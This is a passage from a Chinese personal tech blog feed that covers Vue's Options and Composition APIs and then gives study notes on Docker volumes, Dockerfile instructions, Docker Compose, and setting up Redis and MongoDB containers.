class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;count++&quot;</span>&gt;</span>Count is: &#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">button</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="API风格"><a href="#API风格" class="headerlink" title="API风格"></a>API风格</h3><p>Vue的组件可以按两种不同的风格书写：<strong>选项式 API</strong>和<strong>组合式 API。</strong></p><h4 id="选项式API-Options-API"><a href="#选项式API-Options-API" class="headerlink" title="选项式API (Options API)"></a>选项式API (Options API)</h4><p>使用选项式API，我们可以用包含多个选项的对象来描述组件的逻辑，例如<code>data</code>、<code>methods</code>和<code>mounted</code>。选项所定义的属性都会暴露在函数内部的<br><code>this</code>上，它会指向当前的组件实例。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> &lt;script&gt;</span><br><span class="line">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="comment">// data() 返回的属性将会成为响应式的状态</span></span><br><span class="line">    <span class="comment">// 并且暴露在 `this` 上</span></span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// methods 是一些用来更改状态与触发更新的函数</span></span><br><span class="line">    <span class="comment">// 它们可以在模板中作为事件监听器绑定</span></span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">count</span>++</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生命周期钩子会在组件生命周期的各个不同阶段被调用</span></span><br><span class="line">    <span class="comment">// 例如这个函数就会在组件挂载完成后被调用</span></span><br><span class="line">    <span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`The initial count is <span class="subst">$&#123;<span class="variable language_">this</span>.count&#125;</span>.`</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    @<span class="attr">click</span>=<span class="string">&quot;increment&quot;</span>&gt;</span>Count is: &#123;&#123;count&#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="组合式-API-Composition-API"><a href="#组合式-API-Composition-API" class="headerlink" title="组合式 API (Composition API)"></a><strong>组合式 API (Composition API)</strong></h4><p>通过组合式API，我们可以使用导入的API函数来描述组件逻辑。在单文件中，组合式API通常会与<code>&lt;script setup&gt;</code> 搭配使用。这个<code>setup</code><br>attribute 是一个标识，告诉Vue需要在编译时进行一些处理，让我们可以更简洁使用组合式API。比如比如，<code>&lt;script setup&gt;</code><br>中的导入和顶层变量&#x2F;函数都能够在模板中直接使用。</p><p>下面是使用了组合式 API 与<code>&lt;script setup&gt;</code>改造后和上面的模板完全一样的组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">    <span class="keyword">import</span> &#123;ref, onMounted&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 响应式状态</span></span><br><span class="line">    <span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用来修改状态、触发更新的函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span><br><span class="line">    count.<span class="property">value</span>++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生命周期钩子</span></span><br><span class="line">    <span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`The initial count is <span class="subst">$&#123;count.value&#125;</span>.`</span>)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    @<span class="attr">click</span>=<span class="string">&quot;increment&quot;</span>&gt;</span>Count is: &#123;&#123;count&#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker学习</title>
      <link href="/2023/01/13/docker%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/01/13/docker%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="数据挂载"><a href="#数据挂载" class="headerlink" title="数据挂载"></a>数据挂载</h1><p>docker提供两种将数据从宿主机挂载到容器中：</p><ul><li>volumes:将docker的文件系统挂载到<code>/var/lib/docker/volumes</code></li><li>bind mounts:将宿主机上的任意位置的文件或目录挂载到容器中</li></ul><h3 id="volumes示例："><a href="#volumes示例：" class="headerlink" title="volumes示例："></a>volumes示例：</h3><ol><li><p>创建数据卷</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker volume create nginx-vol</span><br><span class="line">docker volume <span class="built_in">ls</span></span><br><span class="line">docker volume inspect nginx-vol</span><br></pre></td></tr></table></figure></li><li><p>使用数据卷</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=nginx-test --mount src=nginx-vol,dst=/usr/share/nginx/html nginx</span><br><span class="line">docekr run -d --name=nginx-test -v nginx-vol:/usr/share/nginx/html nginx</span><br></pre></td></tr></table></figure></li></ol><h3 id="bind-mount示例："><a href="#bind-mount示例：" class="headerlink" title="bind mount示例："></a>bind mount示例：</h3><ol><li><p>挂载宿主机目录到容器</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=nginx-test --mount <span class="built_in">type</span>=<span class="built_in">bind</span>,src</span><br><span class="line">docker volume <span class="built_in">ls</span></span><br><span class="line">docker volume inspect nginx-vol</span><br></pre></td></tr></table></figure></li><li><p>使用数据卷</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=nginx-test --mount src=nginx-vol,dst=/usr/share/nginx/html nginx</span><br><span class="line">docekr run -d --name=nginx-test -v nginx-vol:/usr/share/nginx/html nginx</span><br></pre></td></tr></table></figure></li></ol><h1 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h1><p>常使用的指令</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置基础镜像</span></span><br><span class="line">FORM</span><br><span class="line"><span class="comment"># 设置基础镜像</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># RUN有两个格式</span></span></span><br><span class="line"><span class="comment"># RUN &lt;command&gt; (shell 格式，linux默认使用/bin/sh windows默认使用cmd /S /C)</span></span><br><span class="line"><span class="comment"># RUN /bin/bash -c &#x27;echo WJLab&#x27;</span></span><br><span class="line"><span class="comment"># RUN [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]</span></span><br><span class="line"><span class="comment"># RUN [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;echo WJLab&quot;]</span></span><br><span class="line"><span class="comment"># Windows命令 需要多反斜杠进行转义</span></span><br><span class="line"><span class="comment"># RUN [&quot;c:\\windows\\system32\\tasklist.exe&quot;]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># 每个dockerfile文件中只能有一个CMD指令</span></span></span><br><span class="line"><span class="comment"># 当存在多个CMD时，只有最后一个会生效</span></span><br><span class="line"><span class="comment"># CMD command param1 param2 (shell 格式)</span></span><br><span class="line"><span class="comment"># CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;] (exec格式, 推荐格式)</span></span><br><span class="line"><span class="comment"># CMD [&quot;param1&quot;,&quot;param2&quot;] </span></span><br><span class="line"><span class="comment"># 参数必须使用双引号</span></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...</span></span></span><br><span class="line"><span class="keyword">EXPOSE</span></span><br><span class="line"><span class="comment"># EXPOSE &lt;port&gt; [&lt;port&gt;/&lt;protocol&gt;...]</span></span><br><span class="line"><span class="comment"># 设置容器指定监听地址</span></span><br><span class="line"><span class="keyword">ENV</span></span><br><span class="line"><span class="comment"># 设置环境变量</span></span><br><span class="line"><span class="comment"># ENV MY_CAT=fluffy</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># 设置添加文件所属用户</span></span></span><br><span class="line"><span class="comment"># ADD [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;src&gt;&quot;,... &quot;&lt;dest&gt;&quot;]</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;src&gt;&quot;,... &quot;&lt;dest&gt;&quot;]</span></span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># 和CMD一样也有两种格式，容器启动后执行的命令</span></span></span><br><span class="line"><span class="comment"># ENTRYPOINT [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]</span></span><br><span class="line"><span class="comment"># ENTRYPOINT command param1 param2</span></span><br><span class="line">VLOUME</span><br><span class="line"><span class="comment"># 磁盘挂载</span></span><br><span class="line"><span class="keyword">USER</span></span><br><span class="line"><span class="comment"># 设置容器内启动用户</span></span><br><span class="line"><span class="comment"># USER &lt;user&gt;[:&lt;group&gt;] </span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># WORKDIR指令为Dockerfile中跟随它的任何RUN、CMD、ENTRYPOINT、COPY和ADD指令设置工作目录</span></span></span><br><span class="line"><span class="comment"># WORKDIR/path/to/workdir</span></span><br><span class="line"><span class="keyword">SHELL</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># 设置Shell</span></span></span><br></pre></td></tr></table></figure><h1 id="Docker-Compose使用"><a href="#Docker-Compose使用" class="headerlink" title="Docker Compose使用"></a>Docker Compose使用</h1><p>Docker Compose使用YAML文件来定义多服务的应用。YAML是JSON的一个子集。</p><p>Docker Compose默认使用文件名docker-compose.yml，用户也可以使用-f参数指定具体文件。</p><p>Compose文件示例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Compose文件部署一个小型Flask应用</span></span><br><span class="line"><span class="comment"># 文件的基本结构包含四个一级Key: version、services、networks、volumes</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.5&#x27;</span> <span class="comment"># 必须指定，定义了Compose文件格式(主要是API)，并非是docker等软件版本，也不是镜像版本</span></span><br><span class="line"><span class="attr">services:</span> <span class="comment"># 定义不同的应用服务，并使用对应key去创建容器</span></span><br><span class="line">  <span class="attr">web-fe:</span> <span class="comment"># web前端服务</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">../../../../Downloads/2ca795e5-bcc5-454b-b86b-66d898441190_Export-7e8b8b0a-9a64-4e0c-a809-9be4e17806bb/intBJW</span> <span class="string">5474d6448d824f288be5e0ee64b225e2</span> <span class="comment"># 指定Docker基于当前目录(.)下的Dockerfile中的定义指令来构建一个新镜像，这个镜像会被用于启动该服务的容器</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">python</span> <span class="string">app.py</span> <span class="comment"># 指定Docker容器中名为app.py的Python脚本作为主程序吗，当然，此镜像中必须包括app.py文件以及Python(Dockerfile) 可以覆盖Dockerfile中的CMD命令</span></span><br><span class="line">    <span class="attr">ports:</span> <span class="comment"># 定义端口</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">target:</span> <span class="number">5000</span> <span class="comment"># 容器内端口</span></span><br><span class="line">        <span class="attr">published:</span> <span class="number">5000</span> <span class="comment"># 发布端口=宿主机端口</span></span><br><span class="line">    <span class="attr">networks:</span> <span class="comment"># 将web连接到指定的网络上</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">counter-net</span></span><br><span class="line">    <span class="attr">volumes:</span> <span class="comment"># 指定数据卷 </span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">volume</span> <span class="comment"># 数据卷类型</span></span><br><span class="line">        <span class="attr">source:</span> <span class="string">counter-volume</span> <span class="comment"># 数据卷(宿主机)</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/code</span> <span class="comment"># 容器内路径</span></span><br><span class="line">  <span class="attr">redis:</span> <span class="comment"># redis服务</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;redis:alpine&quot;</span> <span class="comment"># 指定镜像，该镜像会从Docker Hub中拉取下来</span></span><br><span class="line">    <span class="attr">networks:</span> <span class="comment"># 将redis连接到指定网络上</span></span><br><span class="line">      <span class="attr">counter-net:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span> <span class="comment"># 用于指引Docker创建新的网络</span></span><br><span class="line">  <span class="attr">counter-net:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span> <span class="comment"># 用于指引Docker创建新的数据卷</span></span><br><span class="line">  <span class="attr">counter-vol:</span></span><br></pre></td></tr></table></figure><p>使用docker-compose部署应用</p><p>文件目录：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ubuntu@ubuntu:~/docker/counter-app-master$</span> <span class="string">ls</span></span><br><span class="line"><span class="string">app.py</span>  <span class="string">docker-compose.yml</span>  <span class="string">Dockerfile</span>  <span class="string">README.md</span>  <span class="string">requirements.txt</span></span><br></pre></td></tr></table></figure><ul><li><a href="http://app.py/">app.py</a> 应用程序代码</li><li>docker-compose.yml是Compose文件，定义docker服务怎么部署应用</li><li>Dockerfile定义如何构建web-fe服务所使用的镜像</li><li>requirements.txt 列出了应用所依赖的Python包</li></ul><p>部署中出现的问题：</p><p>使用pip安装python库时出现网络问题，安装报错</p><p>删除<code>/etc/docker/daemon.json</code> 后安装成功</p><p>构建springboot镜像的Dockerfile示例：</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> intbjw</span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> ./target/dockerdemo-0.0.1-SNAPSHOT.jar app.jar</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="language-bash"> /code</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> bash -c <span class="string">&#x27;touch /app.jar&#x27;</span></span></span><br><span class="line"><span class="comment"># 用于设定容器启动时第一个运行的命令及器参数</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>,<span class="string">&quot;-Djava.security.egd=file:/dev/./urandom&quot;</span>,<span class="string">&quot;-jar&quot;</span>,<span class="string">&quot;/app.jar&quot;</span>]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件放在容器中的&#x2F;docker-entrypoint-initdb.d&#x2F; 目录，在容器第一次启动时执行，之后重启容器不会重复执行。有时会出现权限不对的情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/intbjw/docker/WJC2# docker-compose -f mongo.yml up</span><br><span class="line">Starting mongodb ... <span class="keyword">done</span></span><br><span class="line">Attaching to mongodb</span><br><span class="line">mongodb    | /usr/local/bin/docker-entrypoint.sh: line 385: /docker-entrypoint-initdb.d/mongo-init.sh: Permission denied</span><br><span class="line">mongodb exited with code 1</span><br></pre></td></tr></table></figure><p>构建镜像时，终端输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">~/IdeaProjects/dockerdemo ⌚ 10:10:58</span><br><span class="line">$ docker build -t  web:1.0 .</span><br><span class="line">[+] Building 191.7s (9/9) FINISHED                                                                                                                                                                                                                                                                                      </span><br><span class="line"> =&gt; [internal] load build definition from Dockerfile                                                                                                                                                                                                                                                               0.1s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 250B                                                                                                                                                                                                                                                                               0.0s</span><br><span class="line"> =&gt; [internal] load .dockerignore                                                                                                                                                                                                                                                                                  0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 2B                                                                                                                                                                                                                                                                                    0.0s</span><br><span class="line"> =&gt; [internal] load metadata <span class="keyword">for</span> docker.io/library/openjdk:8                                                                                                                                                                                                                                                      45.7s</span><br><span class="line"> =&gt; [internal] load build context                                                                                                                                                                                                                                                                                  0.4s</span><br><span class="line"> =&gt; =&gt; transferring context: 17.56MB                                                                                                                                                                                                                                                                               0.4s</span><br><span class="line"> =&gt; [1/3] FROM docker.io/library/openjdk:8@sha256:208812d8c45e0f5cb51c35b143094bd28322bad83ec8e463a1cbe3c5a6308b1f                                                                                                                                                                                               134.0s</span><br><span class="line"> =&gt; =&gt; resolve docker.io/library/openjdk:8@sha256:208812d8c45e0f5cb51c35b143094bd28322bad83ec8e463a1cbe3c5a6308b1f                                                                                                                                                                                                11.2s</span><br><span class="line"> =&gt; =&gt; sha256:47482c603b2a221f7f968380801639c3d108d18d33d77c93d44cfe8953c90548 7.81kB / 7.81kB                                                                                                                                                                                                                     0.0s</span><br><span class="line"> =&gt; =&gt; sha256:412caad352a3ecbb29c080379407ae0761e7b9b454f7239cbfd1d1da25e06b29 5.15MB / 5.15MB                                                                                                                                                                                                                    38.3s</span><br><span class="line"> =&gt; =&gt; sha256:208812d8c45e0f5cb51c35b143094bd28322bad83ec8e463a1cbe3c5a6308b1f 1.04kB / 1.04kB                                                                                                                                                                                                                     0.0s</span><br><span class="line"> =&gt; =&gt; sha256:93227b5ffb978363dfa3d493a0d25ccc943405260865437660bfec2af3174a73 1.79kB / 1.79kB                                                                                                                                                                                                                     0.0s</span><br><span class="line"> =&gt; =&gt; sha256:0c6b8ff8c37e92eb1ca65ed8917e818927d5bf318b6f18896049b5d9afc28343 54.92MB / 54.92MB                                                                                                                                                                                                                  60.0s</span><br><span class="line"> =&gt; =&gt; sha256:e6d3e61f7a504fa66d7275123969e9917570188650eb84b2280a726b996040f6 10.87MB / 10.87MB                                                                                                                                                                                                                  43.8s</span><br><span class="line"> =&gt; =&gt; sha256:461bb1d8c517c7f9fc0f1df66c9dc34c85a23421c1e1c540b2e28cbb258e75f5 54.57MB / 54.57MB                                                                                                                                                                                                                  95.2s</span><br><span class="line"> =&gt; =&gt; sha256:e442ee9d8dd9896a5b3b67117060f2af4ae8e997af7297009e7d0ea4b6595163 5.42MB / 5.42MB                                                                                                                                                                                                                    74.9s</span><br><span class="line"> =&gt; =&gt; sha256:36b5bcea956cbbcc7e16356354d5eb4b5b3834a43d708ca6c3fd048f33ddc579 211B / 211B                                                                                                                                                                                                                        88.1s</span><br><span class="line"> =&gt; =&gt; extracting sha256:0c6b8ff8c37e92eb1ca65ed8917e818927d5bf318b6f18896049b5d9afc28343                                                                                                                                                                                                                          2.4s</span><br><span class="line"> =&gt; =&gt; extracting sha256:412caad352a3ecbb29c080379407ae0761e7b9b454f7239cbfd1d1da25e06b29                                                                                                                                                                                                                          0.2s</span><br><span class="line"> =&gt; =&gt; extracting sha256:e6d3e61f7a504fa66d7275123969e9917570188650eb84b2280a726b996040f6                                                                                                                                                                                                                          0.3s</span><br><span class="line"> =&gt; =&gt; sha256:8ed70148ebcf78cba8546f5af3e152a6d9422a3a9d814d7683242e4663e773c3 106.07MB / 106.07MB                                                                                                                                                                                                               130.7s</span><br><span class="line"> =&gt; =&gt; extracting sha256:461bb1d8c517c7f9fc0f1df66c9dc34c85a23421c1e1c540b2e28cbb258e75f5                                                                                                                                                                                                                          3.6s</span><br><span class="line"> =&gt; =&gt; extracting sha256:e442ee9d8dd9896a5b3b67117060f2af4ae8e997af7297009e7d0ea4b6595163                                                                                                                                                                                                                          0.3s</span><br><span class="line"> =&gt; =&gt; extracting sha256:36b5bcea956cbbcc7e16356354d5eb4b5b3834a43d708ca6c3fd048f33ddc579                                                                                                                                                                                                                          0.0s</span><br><span class="line"> =&gt; =&gt; extracting sha256:8ed70148ebcf78cba8546f5af3e152a6d9422a3a9d814d7683242e4663e773c3                                                                                                                                                                                                                          3.1s</span><br><span class="line"> =&gt; [auth] library/openjdk:pull token <span class="keyword">for</span> registry-1.docker.io                                                                                                                                                                                                                                                     0.0s</span><br><span class="line"> =&gt; [2/3] ADD ./target/dockerdemo-0.0.1-SNAPSHOT.jar app.jar                                                                                                                                                                                                                                                       0.2s</span><br><span class="line"> =&gt; [3/3] RUN bash -c <span class="string">&#x27;touch /app.jar&#x27;</span>                                                                                                                                                                                                                                                                             0.4s</span><br><span class="line"> =&gt; exporting to image                                                                                                                                                                                                                                                                                             0.1s</span><br><span class="line"> =&gt; =&gt; exporting layers                                                                                                                                                                                                                                                                                            0.1s</span><br><span class="line"> =&gt; =&gt; writing image sha256:25dd4796c1ce0e27a2cabf65c8029e605a563535ba6d6ed5ec77a97f25429051                                                                                                                                                                                                                       0.0s</span><br><span class="line"> =&gt; =&gt; naming to docker.io/library/web:1.0</span><br></pre></td></tr></table></figure><p>简单解释  <code>java -Djava.security.egd=file:/dev/./urandom -jar app.jar</code><br>在运行的时候配置随机数生成，在一定程度上加快随机数生成。securerandom在java各种组件中使用广泛，可以可靠的产生随机数。但大量产生随机数的情况下，性能会较低。例如产生UUID的场景。</p><p>第一眼看到为什么是<code>/dev/./urandom</code> 而不是<code>/dev/urandom</code> 呢，这是jdk的一个bug引起的(现在还有没有不清楚)<br>，参考文章：<a href="https://blog.csdn.net/Small_StarOne/article/details/102972211">https://blog.csdn.net/Small_StarOne&#x2F;article&#x2F;details&#x2F;102972211</a></p><h1 id="使用Docker搭建Redis"><a href="#使用Docker搭建Redis" class="headerlink" title="使用Docker搭建Redis"></a>使用Docker搭建Redis</h1><p>docker hub官方文档</p><p><a href="https://hub.docker.com/_/redis">Redis - Official Image | Docker Hub</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  -h redis \</span><br><span class="line">  -e REDIS_PASSWORD=redis \</span><br><span class="line">  -v redis-data:/data \</span><br><span class="line">  -p 7788:6379 \</span><br><span class="line">  --name redis \</span><br><span class="line">  --restart always \</span><br><span class="line">  redis:5.0.5-alpine3.9 /bin/sh -c <span class="string">&#x27;redis-server --appendonly yes --requirepass $&#123;REDIS_PASSWORD&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="使用Docker搭建Mongo"><a href="#使用Docker搭建Mongo" class="headerlink" title="使用Docker搭建Mongo"></a>使用Docker搭建Mongo</h1><p>docker hub官方文档</p><p><a href="https://hub.docker.com/_/mongo">Mongo - Official Image | Docker Hub</a></p><p><a href="https://github.com/docker-library/docs/blob/master/mongo/README.md#supported-tags-and-respective-dockerfile-links">docs&#x2F;README.md at master · docker-library&#x2F;docs</a></p><p><a href="https://stackoverflow.com/questions/42912755/how-to-create-a-db-for-mongodb-container-on-start-up">How to create a DB for MongoDB container on start up?</a></p><p>docker-compose.yml</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 